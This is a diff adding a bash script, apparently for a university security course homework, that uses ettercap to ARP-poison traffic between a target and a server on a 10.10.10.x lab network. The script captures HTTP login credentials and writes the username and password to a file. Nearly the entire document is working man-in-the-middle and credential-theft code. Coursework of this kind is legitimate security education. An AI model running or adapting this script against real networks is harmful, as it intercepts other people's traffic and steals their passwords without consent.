@@ -1,0 +1,55 @@
+#!/bin/bash
+
+# arpattack -- MITM ARP poisoning attack using ettercap
+# Author: Oral Okan
+
+printf "  CSEC 504 HW #2 - arpattack\n"
+
+TARGET="10.10.10.20"
+SERVER="10.10.10.30"
+
+HOSTS="hosts.txt"
+OFILE="login.txt"
+
+if [ ! -f "$HOSTS" ]; then
+	echo "ERROR: hosts.txt file does not exist in working directory"
+	exit 1
+fi
+
+TMPDIR=$( mktemp --directory )
+
+ETTER_STDIN="$TMPDIR/etter_stdin.fifo"
+ETTER_STDOUT="$TMPDIR/etter_stdout.fifo"
+
+mkfifo "$ETTER_STDIN"
+mkfifo "$ETTER_STDOUT"
+
+IFACE=$(ip route get "$TARGET" | head -n1 | cut -f3 -d " ")
+
+printf "    Initializing ettercap... "
+ettercap -i "$IFACE" -Tqz -j "$HOSTS" -M arp "/$TARGET//" "/$SERVER//" < "$ETTER_STDIN" > "$ETTER_STDOUT" &
+echo "\n" > "$ETTER_STDIN"
+grep -m1 "Text only Interface activated" < "$ETTER_STDOUT" > /dev/null
+printf "DONE\n"
+printf "    Ready to capture\n"
+
+LINE=$( grep -m1 HTTP < "$ETTER_STDOUT" )
+
+USER=$( echo "$LINE" | grep -P -o '(?<=USER: )\S*' )
+PASS=$( echo "$LINE" | grep -P -o '(?<=PASS: )\S*' )
+
+printf "    Credentials captured:\n"
+printf "      Username: %s\n" "$USER"
+printf "      Password: %s\n" "$PASS"
+
+printf "%s:%s\n" "$USER" "$PASS" > "$OFILE"
+printf "    Captured credentials written to $OFILE\n"
+
+printf "    Shutting down ettercap... "
+echo "q" > "$ETTER_STDIN"
+wait
+printf "DONE\n"
+
+rm -rf "$TMPDIR"
+
+printf "    Attack complete\n\n"
